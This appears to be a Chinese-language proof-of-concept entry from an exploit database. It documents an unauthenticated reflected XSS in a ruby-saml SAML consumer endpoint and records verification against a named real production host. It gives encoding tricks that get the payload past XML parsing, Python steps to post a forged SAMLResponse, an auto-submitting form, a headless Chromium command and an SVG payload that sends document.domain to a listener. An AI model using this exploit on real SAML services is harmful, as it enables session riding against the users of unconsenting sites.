# ruby-saml SP /saml/consume Destination 未转义反射型 XSS（未认证可达，无需有效签名）

- **code**: ruby-saml-sp-saml-consume-destination-未转义反射型-xss-未认证可达-无需有效
- **kind**: payload
- **category**: protocol
- **component**: ruby-saml (SAML SP / ACS)
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 对 https://compliance.tooling.greenmangaming.com/saml/consume 实测：POST 结构合法但签名伪造的 SAMLResponse → HTTP 401，响应体原样含 <svg/onload="...">（无 CSP）；再用无头 Chromium 自动提交表单，注入 JS 回连带出 document.domain=compliance.tooling.greenmangaming.com，证明真实执行。
- **path**: pocs/ruby-saml-sp-saml-consume-destination-未转义反射型-xss-未认证可达-无需有效/poc.txt
- **tags**: xss,saml,ruby-saml,acs,reflected-xss,unauth
- **created_at**: 2026-11-11T15:50:10.742Z
- **engine**: compliance.tooling.greenmangaming.com

## 描述

当 ruby-saml（如 omniauth-saml / 自建 SP）的 ACS 在 validate_destination 步骤校验失败时，会把 Response 的 Destination 属性原文拼进 text/html 错误页且不转义、无 CSP，构成未认证可触发的反射型 XSS。该回显点在签名密码学校验之前，因此无需有效 IdP 签名。利用需诱导受害者浏览器自动提交表单（POST）。注意：cookie 多为 HttpOnly，通常无法直接窃取会话，价值在于同源会话骑乘。

## 正文

```
关键坑：
1) Destination 属性必须做【完整】XML 实体编码：先 &→&amp;，再 <→&lt;、>→&gt;，单引号 '→&apos;。漏转义 & 或 ' 会导致 REXML 解析失败，服务端返回 HTTP 500 <h1>Internal Server Error</h1>（不是 XSS，容易误判为不可注入）。
2) 报文需能被 REXML 解析并走到 validate_destination：需带一个结构合法、值任意的 <ds:Signature>（含 SignedInfo/Reference/DigestValue/SignatureValue）与一个最小 Assertion（Issuer/Subject/NameID/Conditions/AudienceRestriction/AuthnStatement）。
3) ACS 多为 POST-only；GET 传超长 SAMLResponse 可能触发 WEBrick 414/RequestURITooLarge（顺带泄露内部 WEBrick 版本与 localhost:端口）。

验证用 Python 生成（要点）：
esc = PAY.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("'","&apos;")
xml = f"<samlp:Response ... Destination='{esc}'> ... </samlp:Response>"
b64 = base64(xml.encode())
requests.post(ACS, data={"SAMLResponse": b64})   # 期望 HTTP 401 且 body 原样含 payload

真实浏览器执行验证（无头）：
<form method="POST" action="https://<host>/saml/consume"><input type="hidden" name="SAMLResponse" value="<b64>"></form>
<body onload="document.forms[0].submit()">
chromium --headless=new --no-sandbox --no-proxy-server --virtual-time-budget=15000 --dump-dom file_or_http_page
载荷用 location.href 回连受控监听（https 页跳 http 允许，img/fetch 会被混合内容拦）：<svg/onload="location.href='http://LISTEN/OOB?d='+encodeURIComponent(document.domain)">

阴性对照：Destination 设为合法 ACS → 返回 Invalid Signature on SAML Response，无回显。
```
